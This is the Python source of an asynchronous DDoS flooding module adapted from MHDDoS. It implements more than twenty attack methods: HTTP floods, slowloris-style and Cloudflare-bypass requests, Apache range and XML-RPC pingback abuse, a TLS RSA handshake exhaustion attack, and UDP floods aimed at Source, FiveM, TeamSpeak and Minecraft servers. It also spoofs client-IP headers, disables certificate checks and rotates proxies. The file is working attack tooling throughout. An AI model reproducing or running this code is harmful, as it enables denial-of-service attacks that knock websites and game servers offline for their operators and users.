import asyncio
import errno
import math
import random
import struct
import time
from copy import copy
from functools import partial
from os import urandom as randbytes
from socket import (SOL_SOCKET, SO_RCVBUF, inet_ntoa)
from ssl import CERT_NONE, SSLContext, create_default_context
from string import ascii_letters
from threading import Event
from typing import Callable, Optional, Set, Tuple
from urllib import parse

import aiohttp
import async_timeout
from OpenSSL import SSL
from yarl import URL

from . import proxy_proto
from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO 
from .proxies import NoProxySet, ProxySet
from .targets import TargetStats
from .vendor.referers import REFERERS
from .vendor.rotate import params as rotate_params, suffix as rotate_suffix
from .vendor.useragents import USERAGENTS


USERAGENTS = list(USERAGENTS)
REFERERS = list(set(a.strip() for a in REFERERS))

ctx: SSLContext = create_default_context()
ctx.check_hostname = False
try:
    ctx.server_hostname = ""
except AttributeError:
    # Old Python version. SNI might fail even though it's not requested
    # the issue is only fixed in Python3.8+, and the attribute for SSLContext
    # is supported in Python3.7+. With ealier version it's just going
    # to fail
    pass
ctx.verify_mode = CERT_NONE
ctx.set_ciphers("DEFAULT")


trex_ctx = SSL.Context(SSL.TLSv1_2_METHOD)
# Making sure we are using TLS1.2 with RSA cipher suite (key exchange, authentication)
#
# AES256-CCM8             TLSv1.2 Kx=RSA      Au=RSA  Enc=AESCCM8(256) Mac=AEAD
# AES256-CCM              TLSv1.2 Kx=RSA      Au=RSA  Enc=AESCCM(256) Mac=AEAD
# ARIA256-GCM-SHA384      TLSv1.2 Kx=RSA      Au=RSA  Enc=ARIAGCM(256) Mac=AEAD
# AES128-GCM-SHA256       TLSv1.2 Kx=RSA      Au=RSA  Enc=AESGCM(128) Mac=AEAD
# AES128-CCM8             TLSv1.2 Kx=RSA      Au=RSA  Enc=AESCCM8(128) Mac=AEAD
# AES128-CCM              TLSv1.2 Kx=RSA      Au=RSA  Enc=AESCCM(128) Mac=AEAD
# ARIA128-GCM-SHA256      TLSv1.2 Kx=RSA      Au=RSA  Enc=ARIAGCM(128) Mac=AEAD
# AES256-SHA256           TLSv1.2 Kx=RSA      Au=RSA  Enc=AES(256)  Mac=SHA256
# CAMELLIA256-SHA256      TLSv1.2 Kx=RSA      Au=RSA  Enc=Camellia(256) Mac=SHA256
# AES128-SHA256           TLSv1.2 Kx=RSA      Au=RSA  Enc=AES(128)  Mac=SHA256
# CAMELLIA128-SHA256      TLSv1.2 Kx=RSA      Au=RSA  Enc=Camellia(128) Mac=SHA256
# NULL-SHA256             TLSv1.2 Kx=RSA      Au=RSA  Enc=None      Mac=SHA256
trex_ctx.set_cipher_list(b"RSA")
trex_ctx.set_verify(SSL.VERIFY_NONE, None)


class Methods:
    HTTP_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "RGET", "HEAD", "RHEAD", "POST", "STRESS", "DYN", "SLOW",
        "NULL", "COOKIE", "PPS", "EVEN", "AVB", "OVH",
        "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP",
        # this is not HTTP method (rather TCP) but this way it works with --http-methods
        # settings being applied to the entire set of targets
        "TREX" 
    }
    TCP_METHODS: Set[str] = {"TCP",}
    UDP_METHODS: Set[str] = {
        "UDP", "VSE", "FIVEM", "TS3", "MCPE",
        # the following methods are temporarily disabled for further investigation and testing
        # "SYN", "CPS",
        # Amplification
        # "ARD", "CHAR", "RDP", "CLDAP", "MEM", "DNS", "NTP"
    }
    ALL_METHODS: Set[str] = {*HTTP_METHODS, *UDP_METHODS, *TCP_METHODS}


class Tools:
    @staticmethod
    def humanbits(i: int) -> str:
        MULTIPLES = ["Bit", "kBit", "MBit", "GBit"]
        if i > 0:
            base = 1024
            multiple = math.trunc(math.log2(i) / math.log2(base))
            value = i / pow(base, multiple)
            return f'{value:.2f} {MULTIPLES[multiple]}'
        else:
            return '0 Bit'

    @staticmethod
    def humanformat(num: int, precision: int = 2) -> str:
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes)))
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return str(num)

    @staticmethod
    def parse_params(url, ip, proxies):
        result = url.host.lower().endswith(rotate_suffix)
        if result:
            return random.choice(rotate_params), NoProxySet
        return (url, ip), proxies

    @staticmethod
    def rand_str(length=16):
        return ''.join(random.choices(ascii_letters, k=length))

    @staticmethod
    def rand_ipv4():
        return inet_ntoa(
            struct.pack('>I', random.randint(1, 0xffffffff))
        )


def request_info_size(request: aiohttp.RequestInfo) -> int:
    headers = "\r\n".join(f"{k}: {v}" for k, v in request.headers.items())
    status_line = f"{request.method} {request.url} HTTP/1.1"
    return len(f"{status_line}\r\n{headers}\r\n\r\n".encode())


class AttackSettings:
    connect_timeout_seconds: float
    dest_connect_timeout_seconds: float
    drain_timeout_seconds: float
    close_timeout_seconds: float
    http_response_timeout_seconds: float
    tcp_read_timeout_seconds: float
    requests_per_connection: int
    high_watermark: int
    socket_rcvbuf: int

    def __init__(
        self,
        *,
        connect_timeout_seconds: float = 8,
        dest_connect_timeout_seconds: float = 8,
        drain_timeout_seconds: float = 5.0,
        close_timeout_seconds: float = 1.0,
        http_response_timeout_seconds: float = 15.0,
        tcp_read_timeout_seconds: float = 0.2,
        requests_per_connection: int = 1024,
        high_watermark: int = 1024 << 5,
        reader_limit: int = 1024 << 6,
        socket_rcvbuf: int = 1024 << 5,
    ):
        self.connect_timeout_seconds = connect_timeout_seconds
        self.dest_connect_timeout_seconds = dest_connect_timeout_seconds
        self.drain_timeout_seconds = drain_timeout_seconds
        self.close_timeout_seconds = close_timeout_seconds
        self.http_response_timeout_seconds = http_response_timeout_seconds
        self.tcp_read_timeout_seconds = tcp_read_timeout_seconds
        self.requests_per_connection = requests_per_connection
        self.high_watermark = high_watermark
        self.reader_limit = reader_limit
        self.socket_rcvbuf = socket_rcvbuf

    def with_options(self, **kwargs) -> "AttackSettings":
        settings = copy(self)
        for k, v in kwargs.items():
            if v is not None:
                assert hasattr(settings, k)
                setattr(settings, k, v)
        return settings


class AsyncTcpFlood:

    BASE_HEADERS = (
        'Accept-Encoding: gzip, deflate, br\r\n'
        'Accept-Language: en-US,en;q=0.9\r\n'
        'Cache-Control: max-age=0\r\n'
        'Connection: Keep-Alive\r\n'
        'Sec-Fetch-Dest: document\r\n'
        'Sec-Fetch-Mode: navigate\r\n'
        'Sec-Fetch-Site: none\r\n'
        'Sec-Fetch-User: ?1\r\n'
        'Sec-Gpc: 1\r\n'
        'Pragma: no-cache\r\n'
        'Upgrade-Insecure-Requests: 1\r\n'
    )

    def __init__(
        self,
        target: URL,
        addr: str,
        method: str,
        event: Event,
        proxies: ProxySet,
        stats: TargetStats,
        loop,
        settings: Optional[AttackSettings] = None
    ) -> None:
        self.SENT_FLOOD = None
        self._event = event
        self._target = target
        self._addr = addr
        self._raw_target = (self._addr, (self._target.port or 80))
        self._stats = stats
        self._proxies = proxies
        self._req_type = (
            "POST" if method.upper() in {"POST", "XMLRPC", "STRESS"}
            else "HEAD" if method.upper() in {"HEAD", "RHEAD"}
            else "GET"
        )

        self._method = method
        self.SENT_FLOOD = getattr(self, method)

        self._loop = loop
        self._settings = settings or AttackSettings()

    @property
    def desc(self) -> Tuple[str, int, str]:
        return (self._target.host, self._target.port, self._method)

    @property
    def is_tls(self):
        return self._target.scheme.lower() == "https" or self._target.port == 443

    def spoof_ip(self) -> str:
        spoof: str = Tools.rand_ipv4()
        return (
            f"X-Forwarded-Host: {self._target.raw_host}\r\n"
            f"Via: {spoof}\r\n"
            f"Client-IP: {spoof}\r\n"
            f'X-Forwarded-Proto: https\r\n'
            f'X-Forwarded-For: {spoof}\r\n'
            f'Real-IP: {spoof}\r\n'
        )

    def random_headers(self) -> str:
        return (
            f"User-Agent: {random.choice(USERAGENTS)}\r\n"
            f"Referer: {random.choice(REFERERS)}{parse.quote(self._target.human_repr())}\r\n" +
            self.spoof_ip()
        )

    def default_headers(self) -> str:
        return (
            f"Host: {self._target.authority}\r\n"
            + self.BASE_HEADERS
            + self.random_headers()
        )

    @property
    def default_path_qs(self):
        return self._target.raw_path_qs

    def add_rand_query(self, path_qs) -> str:
        if self._target.raw_query_string:
            path_qs += '&%s=%s' % (Tools.rand_str(6), Tools.rand_str(6))
        else:
            path_qs += '?%s=%s' % (Tools.rand_str(6), Tools.rand_str(6))
        return path_qs

    def build_request(self, path_qs=None, headers=None, body=None) -> bytes:
        path_qs = path_qs or self.default_path_qs
        headers = headers or self.default_headers()
        request = (
            f"{self._req_type} {path_qs} HTTP/1.1\r\n"
            + headers
            + '\r\n'
        )
        if body:
            request += body
        return request.encode()

    async def run(self, on_connect=None) -> bool:
        try:
            return await self.SENT_FLOOD(on_connect=on_connect)
        except OSError as exc:
            if exc.errno == errno.ENOBUFS:
                await asyncio.sleep(0.1)
                # going to try again, hope device will be ready
                return True
            else:
                raise exc

    # XXX: get rid of RPC param when OVH is gone
    async def _generic_flood_proto(
        self,
        payload_type: FloodSpecType,
        payload,
        on_connect: Optional[asyncio.Future],
        *,
        rpc: Optional[int] = None
    ) -> bool:
        on_close = self._loop.create_future()
        rpc = rpc or self._settings.requests_per_connection
        flood_proto = partial(
            FloodIO,
            self._loop,
            on_close,
            self._stats,
            self._settings,
            FloodSpec.from_any(payload_type, payload, rpc),
            on_connect=on_connect,
        )
        server_hostname = "" if self.is_tls else None
        ssl_ctx = ctx if self.is_tls else None
        proxy_url: Optional[str] = self._proxies.pick_random()
        if proxy_url is None:
            conn = self._loop.create_connection(
                flood_proto,
                host=self._addr,
                port=self._target.port,
                ssl=ssl_ctx,
                server_hostname=server_hostname
            )
        else:
            proxy, proxy_protocol = proxy_proto.for_proxy(proxy_url)
            flood_proto = partial(
                proxy_protocol,
                self._loop,
                on_close,
                self._raw_target,
                ssl_ctx,
                downstream_factory=flood_proto,
                connect_timeout=self._settings.dest_connect_timeout_seconds,
                on_connect=on_connect,
            )
            conn = self._loop.create_connection(
                flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)

        return await self._exec_proto(conn, on_connect, on_close)

    async def GET(self, on_connect=None) -> bool:
        payload: bytes = self.build_request()
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def RGET(self, on_connect=None) -> bool:
        payload: bytes = self.build_request(
            path_qs=self.add_rand_query(self.default_path_qs)
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    HEAD = GET
    RHEAD = RGET

    async def POST(self, on_connect=None) -> bool:
        payload: bytes = self.build_request(
            headers=(
                self.default_headers() +
                "Content-Length: 44\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/json\r\n"
            ),
            body='{"data": %s' % Tools.rand_str(32)
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def STRESS(self, on_connect=None) -> bool:
        payload: bytes = self.build_request(
            headers=(
                self.default_headers() +
                f"Content-Length: 524\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/json\r\n"
            ),
            body='{"data": %s}' % Tools.rand_str(512)
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def COOKIE(self, on_connect=None) -> bool:
        payload: bytes = self.build_request(
            headers=(
                self.default_headers() +
                f"Cookie: _ga=GA{random.randint(1000, 99999)};"
                " _gat=1;"
                " __cfduid=dc232334gwdsd23434542342342342475611928;"
                f" {Tools.rand_str(6)}={Tools.rand_str(32)}\r\n"
            )
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def APACHE(self, on_connect=None) -> bool:
        payload: bytes = self.build_request(
            headers=(
                self.default_headers() +
                "Range: bytes=0-,%s\r\n" % ",".join("5-%d" % i for i in range(1, 1024))
            )
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def XMLRPC(self, on_connect=None) -> bool:
        payload: bytes = self.build_request(
            headers=(
                self.default_headers() +
                "Content-Length: 345\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/xml\r\n"
            ),
            body=(
                "<?xml version='1.0' encoding='iso-8859-1'?>"
                "<methodCall><methodName>pingback.ping</methodName>"
                f"<params><param><value><string>{Tools.rand_str(64)}</string></value>"
                f"</param><param><value><string>{Tools.rand_str(64)}</string>"
                "</value></param></params></methodCall>"
            )
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def PPS(self, on_connect=None) -> bool:
        payload = self.build_request(headers=f"Host: {self._target.authority}\r\n")
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def DYN(self, on_connect=None) -> bool:
        payload: bytes = self.build_request(
            headers=(
                "Host: %s.%s\r\n" % (Tools.rand_str(6), self._target.authority)
                + self.BASE_HEADERS
                + self.random_headers()
            )
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def NULL(self, on_connect=None) -> bool:
        payload: bytes = self.build_request(
            path_qs=self._target.raw_path_qs,
            headers=(
                f"Host: {self._target.authority}\r\n"
                "User-Agent: null\r\n"
                "Referer: null\r\n"
                + self.BASE_HEADERS
                + self.spoof_ip()
            )
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def BYPASS(self, on_connect=None) -> bool:
        connector = self._proxies.pick_random_connector()
        packets_sent = 0
        cl_timeout = aiohttp.ClientTimeout(connect=self._settings.connect_timeout_seconds)
        async with aiohttp.ClientSession(connector=connector, timeout=cl_timeout) as s:
            for _ in range(self._settings.requests_per_connection):
                async with s.get(self._target.human_repr()) as response:
                    if on_connect and not on_connect.done():
                        on_connect.set_result(True)
                    self._stats.track(1, request_info_size(response.request_info))
                    packets_sent += 1
                    # XXX: we need to track in/out traffic separately
                    async with async_timeout.timeout(self._settings.http_response_timeout_seconds):
                        await response.read()
        return packets_sent > 0

    async def CFB(self, on_connect=None) -> bool:
        packet: bytes = self.build_request()
        packet_size: int = len(packet)

        def _gen():
            yield FloodOp.WRITE, (packet, packet_size)
            yield FloodOp.SLEEP, 5.01
            deadline = time.time() + 120
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.WRITE, (packet, packet_size)
                if time.time() > deadline:
                    return

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def EVEN(self, on_connect=None) -> bool:
        packet: bytes = self.build_request()
        packet_size: int = len(packet)

        def _gen():
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.WRITE, (packet, packet_size)
                # XXX: have to setup buffering properly for this attack to be effective
                yield FloodOp.READ, 1

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def OVH(self, on_connect=None) -> int:
        payload: bytes = self.build_request()
        # XXX: we might want to remove this attack as we don't really
        #      track cases when high number of packets on the same connection
        #      leads to IP being blocked
        return await self._generic_flood_proto(
            FloodSpecType.BYTES,
            payload,
            on_connect,
            rpc=min(self._settings.requests_per_connection, 5),
        )

    async def AVB(self, on_connect=None) -> bool:
        packet: bytes = self.build_request()
        packet_size: int = len(packet)

        def _gen():
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.SLEEP, 1
                yield FloodOp.WRITE, (packet, packet_size)

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def SLOW(self, on_connect=None) -> bool:
        packet: bytes = self.build_request()
        packet_size: int = len(packet)

        def _gen():
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.WRITE, (packet, packet_size)
            while True:
                yield FloodOp.WRITE, (packet, packet_size)
                yield FloodOp.READ, 1
                # XXX: note this weid break in the middle of the code:
                #        https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L1072
                #      this attack has to be re-tested
                keep = str.encode("X-a: %d\r\n" % random.randint(1, 5000))
                yield FloodOp.WRITE, (keep, len(keep))
                yield FloodOp.SLEEP, 10

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def DOWNLOADER(self, on_connect=None) -> bool:
        packet: bytes = self.build_request()
        packet_size: int = len(packet)

        def _gen():
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.WRITE, (packet, packet_size)
                while True:
                    yield FloodOp.SLEEP, 0.1
                    yield FloodOp.READ, 1
                    # XXX: how to detect EOF here?
                    #      the problem with such attack is that if we already got
                    #      EOF, there's no need to perform any other operations
                    #      within range(_) loop. original code from MHDDOS seems to
                    #      be broken on the matter:
                    #         https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L910
            yield FloodOp.WRITE, (b'0', 1)

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def TCP(self, on_connect=None) -> bool:
        self._settings = self._settings.with_options(high_watermark=1024 << 2)
        packet_size = 1024
        return await self._generic_flood_proto(
            FloodSpecType.CALLABLE,
            partial(randbytes, packet_size),
            on_connect
        )

    async def RHEX(self, on_connect=None) -> bool:
        # XXX: not sure if this is gonna be a proper "hex". maybe we need
        #      to do a hex here instead of just wrapping into str
        randhex: str = str(randbytes(random.choice([32, 64, 128])))
        packet = self.build_request(
            path_qs=f'{self._target.authority}/{randhex}',
            headers=(
                f"Host: {self._target.authority}/{randhex}\r\n"
                + self.BASE_HEADERS
                + self.random_headers()
            )
        )

        return await self._generic_flood_proto(FloodSpecType.BYTES, packet, on_connect)

    async def STOMP(self, on_connect=None) -> bool:
        # XXX: why r'' string? Why space at the end?
        hexh = (
            r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87'
            r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F'
            r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F'
            r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84'
            r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F'
            r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98'
            r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98'
            r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B'
            r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99'
            r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C'
            r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
        )

        p1: bytes = self.build_request(
            path_qs=f'{self._target.authority}/{hexh}',
            headers=(
                f"Host: {self._target.authority}/{hexh}\r\n"
                + self.BASE_HEADERS
                + self.random_headers()
            )
        )
        p2: bytes = self.build_request(
            path_qs=f'{self._target.authority}/cdn-cgi/l/chk_captcha',
            headers=(
                f"Host: {hexh}\r\n"
                + self.BASE_HEADERS
                + self.random_headers()
            )
        )

        p1_size, p2_size = len(p1), len(p2)

        def _gen():
            yield FloodOp.WRITE, (p1, p1_size)
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.WRITE, (p2, p2_size)

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def TREX(self, on_connect=None) -> bool:
        on_close = self._loop.create_future()

        trex_proto = partial(
            TrexIO,
            trex_ctx,
            self._settings.requests_per_connection,
            self._stats,
            self._loop,
            on_connect,
            on_close
        )
        proxy_url: Optional[str] = self._proxies.pick_random()
        if proxy_url is None:
            addr, port = self._raw_target
            conn = self._loop.create_connection(trex_proto, host=addr, port=port, ssl=None)
        else:
            proxy, proxy_protocol = proxy_proto.for_proxy(proxy_url)
            on_socket = self._loop.create_future()
            trex_proto = partial(
                proxy_protocol,
                self._loop,
                on_close,
                self._raw_target,
                None,
                downstream_factory=trex_proto,
                connect_timeout=self._settings.dest_connect_timeout_seconds,
                on_connect=self._loop.create_future() # as we don't want it to fire too early
            )
            conn = self._loop.create_connection(
                trex_proto, host=proxy.proxy_host, port=proxy.proxy_port, ssl=None)

        return await self._exec_proto(conn, on_connect, on_close)

    async def _exec_proto(self, conn, on_connect, on_close) -> bool:
        transport = None
        try:
            async with async_timeout.timeout(self._settings.connect_timeout_seconds):
                transport, _ = await conn
            sock = transport.get_extra_info("socket")
            if sock and hasattr(sock, "setsockopt"):
                sock.setsockopt(SOL_SOCKET, SO_RCVBUF, self._settings.socket_rcvbuf)
        except asyncio.CancelledError as e:
            if on_connect:
                on_connect.cancel()
            on_close.cancel()
            raise e
        except Exception as e:
            if on_connect:
                on_connect.set_exception(e)
            raise e
        else:
            return bool(await on_close)
        finally:
            if transport:
                transport.close()


class AsyncUdpFlood:

    def __init__(
        self,
        target: Tuple[str, int],
        method: str,
        event: Event,
        proxies: ProxySet,
        stats: TargetStats,
        loop,
        settings: Optional[AttackSettings] = None,
    ):
        self.SENT_FLOOD = None
        self._target = target
        self._event = event
        self._stats = stats
        self._proxies = proxies
        self._loop = loop
        self._settings = settings or AttackSettings()

        self._method = method
        self.SENT_FLOOD = getattr(self, method)

    @property
    def desc(self) -> Tuple[str, int, str]:
        addr, port = self._target
        return (addr, port, self._method)

    async def run(self) -> bool:
        return await self.SENT_FLOOD()

    async def _generic_flood(self, packet_gen: Callable[[], Tuple[bytes, int]]) -> bool:
        on_close = self._loop.create_future()
        transport = None
        async with async_timeout.timeout(self._settings.connect_timeout_seconds):
            transport, _ = await self._loop.create_datagram_endpoint(
                partial(DatagramFloodIO, self._loop, self._stats, packet_gen, on_close),
                remote_addr=self._target
            )
        try:
            return bool(await on_close)
        finally:
            if transport:
                transport.close()

    async def UDP(self) -> bool:
        packet_size = 1024
        return await self._generic_flood(lambda: (randbytes(packet_size), packet_size))

    async def VSE(self) -> bool:
        packet: bytes = (
            b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
            b'\x20\x51\x75\x65\x72\x79\x00'
        )
        packet_size = len(packet)
        return await self._generic_flood(lambda: (packet, packet_size))

    async def FIVEM(self) -> bool:
        packet: bytes = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        packet_size = len(packet)
        return await self._generic_flood(lambda: (packet, packet_size))

    async def TS3(self) -> bool:
        packet = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        packet_size = len(packet)
        return await self._generic_flood(lambda: (packet, packet_size))

    async def MCPE(self) -> bool:
        packet: bytes = (
            b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
            b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
            b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
            b'\x73'
        )
        packet_size = len(packet)
        return await self._generic_flood(lambda: (packet, packet_size))


def main(url, ip, method, event, proxies, stats, loop=None, settings=None):
    if method not in Methods.ALL_METHODS:
        raise RuntimeError(f"Method {method} Not Found")

    (url, ip), proxies = Tools.parse_params(url, ip, proxies)
    if method in {*Methods.HTTP_METHODS, *Methods.TCP_METHODS}:
        return AsyncTcpFlood(
            url,
            ip,
            method,
            event,
            proxies,
            stats,
            loop=loop,
            settings=settings,
        )

    if method in Methods.UDP_METHODS:
        return AsyncUdpFlood(
            (ip, url.port),
            method,
            event,
            proxies,
            stats,
            loop=loop,
            settings=settings
        )
